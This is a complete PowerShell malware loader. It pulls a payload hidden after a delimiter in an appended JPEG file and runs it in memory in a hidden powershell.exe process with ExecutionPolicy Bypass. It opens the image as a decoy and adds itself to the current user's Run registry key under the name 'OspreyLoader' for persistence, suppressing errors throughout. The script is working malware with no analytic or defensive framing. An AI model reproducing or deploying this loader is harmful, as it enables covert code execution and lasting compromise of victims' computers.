# Ensure execution policy for current user (non-interactive, non-blocking)
try {
    $currentPolicy = Get-ExecutionPolicy -Scope CurrentUser -ErrorAction Stop
    if ($currentPolicy -ne 'RemoteSigned') {
        Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
    }
} catch {
    # ignore failures changing policy
}

# Resolve script directory and files
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$combinedJpeg = Join-Path $scriptDir "image.jpg"
$delimiter = [Text.Encoding]::UTF8.GetBytes('===PAYLOAD_START===')

if (-not (Test-Path $combinedJpeg)) {
    Write-Error "Combined JPEG not found: $combinedJpeg"
    exit 1
}

# Read file bytes
try {
    $fileBytes = [System.IO.File]::ReadAllBytes($combinedJpeg)
} catch {
    Write-Error "Failed reading image file: $_"
    exit 1
}

# Find delimiter index
function Find-DelimiterIndex {
    param($data, $delim)
    for ($i = 0; $i -le $data.Length - $delim.Length; $i++) {
        $ok = $true
        for ($j = 0; $j -lt $delim.Length; $j++) {
            if ($data[$i + $j] -ne $delim[$j]) { $ok = $false; break }
        }
        if ($ok) { return $i }
    }
    return -1
}

$delimiterIndex = Find-DelimiterIndex -data $fileBytes -delim $delimiter
if ($delimiterIndex -eq -1) {
    # No appended payload found — nothing to run. Just open image and exit.
    Start-Process -FilePath $combinedJpeg -WindowStyle Normal -ErrorAction SilentlyContinue
    exit 0
}

# Extract payload bytes after delimiter
$payloadStart = $delimiterIndex + $delimiter.Length
$payloadLength = $fileBytes.Length - $payloadStart
if ($payloadLength -le 0) {
    Start-Process -FilePath $combinedJpeg -WindowStyle Normal -ErrorAction SilentlyContinue
    exit 0
}
$payloadBytes = New-Object byte[] $payloadLength
[Array]::Copy($fileBytes, $payloadStart, $payloadBytes, 0, $payloadLength)

# Convert payload bytes to text (assume UTF8)
try {
    $payloadText = [Text.Encoding]::UTF8.GetString($payloadBytes)
} catch {
    Write-Error "Failed decoding payload bytes: $_"
    Start-Process -FilePath $combinedJpeg -WindowStyle Normal -ErrorAction SilentlyContinue
    exit 1
}

# Prepare encoded command: PowerShell expects UTF-16LE bytes for -EncodedCommand
$unicodeBytes = [Text.Encoding]::Unicode.GetBytes($payloadText)
$base64 = [Convert]::ToBase64String($unicodeBytes)

# Execute payload in-memory via powershell.exe -EncodedCommand, hidden and non-blocking
try {
    Start-Process -FilePath 'powershell.exe' `
        -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $base64" `
        -WindowStyle Hidden -ErrorAction SilentlyContinue
} catch {
    # If Start-Process fails, try direct invocation (blocking) as fallback
    try {
        powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $base64 2>$null
    } catch {
        # ignore
    }
}

# Open the image with the default viewer (non-blocking)
try {
    Start-Process -FilePath $combinedJpeg -WindowStyle Normal -ErrorAction SilentlyContinue
} catch {
    # ignore
}

# Add loader to current user's Run key for persistence (idempotent)
try {
    $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    $regName = 'OspreyLoader'
    # Use full path to powershell and script to be explicit
    $pwsh = (Get-Command powershell.exe -ErrorAction SilentlyContinue).Source
    if (-not $pwsh) { $pwsh = 'powershell.exe' }
    $escapedScript = $PSCommandPath -replace '"', '""'
    $desiredValue = "$pwsh -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$escapedScript`""
    $currentValue = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
    if ($currentValue -ne $desiredValue) {
        Set-ItemProperty -Path $regPath -Name $regName -Value $desiredValue -ErrorAction SilentlyContinue
    }
} catch {
    # ignore registry errors
}
